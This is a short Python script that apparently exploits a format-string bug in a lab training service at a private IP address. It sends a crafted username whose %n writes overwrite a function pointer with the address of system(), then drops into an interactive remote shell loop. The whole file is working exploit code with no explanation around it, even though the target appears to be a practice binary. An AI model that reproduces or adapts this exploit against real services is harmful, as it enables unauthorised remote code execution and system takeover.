import socket,struct
s=socket.socket()
host='192.168.1.16'
port=2994
s.connect((host,port))
#system:0xb7ecffb0
target=struct.pack("<I",0x804a1a8)
target2=struct.pack("<I",0x804a1a8+2)
payload=b"AAA"+target+b'BBBB'+b'BBBB'+b'BBBB'+target2+b'BBBB'+b'BBBB'+b"B"*8
#		%16		%18		%20		%22		
offset=42
format_str=b'%15$65352p'#b0ff
payload+=format_str+b'E'*(offset-len(format_str))+b"%16$08n"
payload+=b"%17$112700p"#ecb7
payload+=b"%20$08n"
print("Exploiting.....")
s.sendall(b'username '+payload+b"\x0a")
s.sendall(b'login '+b'CCCC'+b"\x0a")
s.recv(1024)
s.recv(1024)
s.recv(1024)#Just announcement that login fail
print("Executing system function.......")
while True:	#Shell interface
      print(s.recv(1024).decode(),end='')
      s.send(input().encode()+b"\n")
      print(s.recv(1024).decode(),end='')
s.close()